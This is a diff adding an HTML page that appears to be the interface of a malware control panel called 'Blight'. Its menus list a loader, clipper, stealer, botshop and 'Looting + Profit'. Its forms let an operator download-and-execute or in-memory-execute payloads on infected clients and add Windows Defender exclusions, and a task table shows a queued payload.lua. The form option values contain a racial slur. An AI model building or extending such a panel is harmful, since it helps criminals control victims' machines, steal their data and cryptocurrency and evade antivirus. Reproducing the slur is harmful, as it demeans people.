@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blight - Clients</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.2/css/all.min.css">
+    <link rel="stylesheet" href="style.css">
+</head>
+
+<body>
+    <div class="container">
+        <aside class="sidebar">
+            <div class="logo">
+                <img src="https://i.ibb.co/zVF2SSZ/image-removebg-preview-3.png">
+                <h1 class="work-sans">Blight</h1>
+            </div>
+            <div class="sidebar-list-container">
+                <ul>
+                    <li>
+                        <p class="work-sans-light">
+                            Client Managment
+                        </p>
+                    </li>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-user"></i>Clients</a></li>
+                    <li class="active"><a href="#" class="work-sans-normal sidebar-link"><i
+                                class="fas fa-upload"></i>Loader</a></li>
+                    <li>
+                        <p class="work-sans-light">
+                            Server Managment
+                        </p>
+                    </li>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-ban"></i>Firewall</a></li>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-code"></i>Server Logs</a>
+                    </li>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-cog"></i>Settings</a></li>
+                    <li>
+                        <p class="work-sans-light">
+                            Looting + Profit
+                        </p>
+                    </li>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-clipboard"></i>Clipper</a>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-mask"></i>Stealer</a></li>
+                    <li><a href="#" class="work-sans-normal sidebar-link"><i class="fas fa-robot"></i>Botshop</a></li>
+
+                </ul>
+            </div>
+        </aside>
+        <main class="content">
+            <div class="forms">
+                <div class="form-container">
+                    <h1 class="form-header work-sans-light">Payload Execution</h1>
+                    <p>Disk supported extensions: Any | Memory supported extensions: DLL, EXE, BIN 
+                    </p>
+                    <hr>
+                    <form action="#" method="post">
+
+                        <select name="Execution Type">
+                            <option value="nigga">Download and execute</option>
+                            <option value="nigga">Execute in memory </option>
+                        </select>
+
+                        <textarea id="message" name="message" required></textarea>
+
+                        <input type="submit" value="Submit">
+                    </form>
+                </div>
+                
+                <div class="form-container">
+                    <h1 class="work-sans-light">Plugins</h1>
+                    <p>Plugins loaded in from your plugins folder.</p>
+                    <p></p>
+                    <hr>
+                    <form action="#" method="post">
+                        <label for="name">Command Type</label>
+
+                        <select name="Execution Type">
+                            <option value="nigga">Windows Defender Exclusion</option>
+                        </select>
+
+                        <label for="message">Arguments</label>
+                        <input type="text">
+
+                        <input type="submit" value="Submit">
+                    </form>
+                </div>
+                
+              
+            </div>
+            <table>
+                <thead>
+                    <tr>
+                        <th>Progress</th>
+                        <th>Recursive</th>
+                        <th>Command Type</th>
+                        <th>Command Arguments</th>
+                        <th>Action</th>
+                    </tr>
+                </thead>
+                <tbody>
+                    <tr>
+                        <td>
+                            <div class="progress-container">
+                                <div class="progress-bar" style="width: 50%;"></div>
+                            </div>
+                        </td>
+
+                        <td><i class="fa-solid fa-check"></i></td>
+                        <td>Lua Execution</td>
+                        <td>file:payload.lua</td>
+                        <td>
+                            <button>Delete</button>
+                        </td>
+                    </tr>
+                </tbody>
+            </table>
+
+
+        </main>
+
+    </div>
+</body>
+
+</html>
